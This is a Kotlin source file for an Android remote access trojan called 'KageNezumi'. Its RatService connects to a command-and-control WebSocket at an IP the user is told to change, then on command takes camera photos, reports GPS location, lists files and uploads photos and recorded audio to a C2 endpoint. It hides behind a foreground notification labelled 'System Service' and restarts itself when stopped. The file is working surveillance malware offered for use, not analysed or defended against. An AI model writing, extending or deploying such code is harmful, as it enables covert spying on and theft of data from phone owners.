package com.example.kagenezumi

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.camera2.*
import android.location.Location
import android.media.ImageReader
import android.os.*
import android.provider.Settings
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.create
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.*
import java.util.concurrent.TimeUnit

class RatService : Service() {

    private lateinit var webSocket: WebSocket
    private val client = OkHttpClient()
    private lateinit var cameraManager: CameraManager
    private lateinit var imageReader: ImageReader
    private lateinit var accessibilityReceiver: BroadcastReceiver

    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "RatServiceChannel"
        private const val NOTIFICATION_ID = 1
        private const val TAG = "RatService"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground()
        initializeCamera()
        registerAccessibilityReceiver()
        connectToC2()
    }

    private fun initializeCamera() {
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 2)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun connectToC2() {
        val wsClient = OkHttpClient.Builder()
            .readTimeout(3, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder()
            .url("ws://192.168.1.4:8080/ws") // CHANGE to your C2 IP/domain
            .build()

        val listener = object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                this@RatService.webSocket = webSocket
                webSocket.send("Connected to KageNezumi")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                when (text) {
                    "camera_snap" -> takePhoto()
                    "get_location" -> sendLocation()
                    "list_files" -> listFiles()
                    "upload_audio" -> uploadFile(File(getExternalFilesDir(null), "recorded_audio.3gp"))
                    else -> webSocket.send("Unknown command: $text")
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
            }
        }

        webSocket = wsClient.newWebSocket(request, listener)
    }

    private fun takePhoto() {
        try {
            val cameraId = cameraManager.cameraIdList[0] // Use first camera
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            
            if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        // Camera opened successfully, take picture
                        createCaptureSession(camera)
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        webSocket.send("❌ Camera error: $error")
                    }
                }, null)
            }
        } catch (e: Exception) {
            webSocket.send("❌ Camera error: ${e.message}")
            Log.e(TAG, "Camera error", e)
        }
    }

    private fun createCaptureSession(cameraDevice: CameraDevice) {
        try {
            val surfaces = listOf(imageReader.surface)
            
            cameraDevice.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    val captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureBuilder.addTarget(imageReader.surface)
                    
                    session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                            val image = imageReader.acquireLatestImage()
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.capacity())
                            buffer.get(bytes)
                            
                            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(file).use { it.write(bytes) }
                            
                            webSocket.send("📷 Photo saved: ${file.name}")
                            uploadFile(file)
                            
                            image.close()
                            session.close()
                            cameraDevice.close()
                        }
                    }, null)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    webSocket.send("❌ Failed to configure camera session")
                    session.close()
                    cameraDevice.close()
                }
            }, null)
        } catch (e: Exception) {
            webSocket.send("❌ Camera session error: ${e.message}")
            Log.e(TAG, "Camera session error", e)
        }
    }

    private fun uploadFile(file: File) {
        if (!file.exists()) {
            webSocket.send("❌ File does not exist: ${file.name}")
            return
        }

        val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, create("application/octet-stream".toMediaTypeOrNull(), file))
            .build()

        val request = Request.Builder()
            .url("http://10.0.2.2:8080/upload") // Change to your C2 upload endpoint
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                webSocket.send("❌ Upload failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                webSocket.send("✅ File uploaded: ${file.name}")
            }
        })
    }

    private fun sendLocation() {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        try {
            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
                if (location != null) {
                    val locString = "📍 Lat: ${location.latitude}, Lon: ${location.longitude}"
                    webSocket.send(locString)
                } else {
                    webSocket.send("❌ Location unavailable")
                }
            }.addOnFailureListener { e ->
                webSocket.send("❌ Location error: ${e.message}")
            }
        } catch (e: SecurityException) {
            webSocket.send("❌ Location permission missing")
        }
    }

    private fun listFiles() {
        val root = File(getExternalFilesDir(null)?.absolutePath ?: return)
        val builder = StringBuilder("📁 Files:\n")
        root.walkTopDown().forEach {
            if (it.isFile) builder.append("${it.absolutePath}\n")
        }
        webSocket.send(builder.toString())
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system service"
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startForeground() {
        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
        } else {
            NotificationCompat.Builder(this)
        }

        val notification = notificationBuilder
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(R.drawable.ic_notification)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun registerAccessibilityReceiver() {
        accessibilityReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == Settings.ACTION_ACCESSIBILITY_SETTINGS) {
                    // Handle accessibility settings changes
                    webSocket.send("Accessibility settings changed")
                }
            }
        }
        
        val filter = IntentFilter(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        registerReceiver(accessibilityReceiver, filter)
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(accessibilityReceiver)
        webSocket.close(1000, "Service destroyed")
    }
}
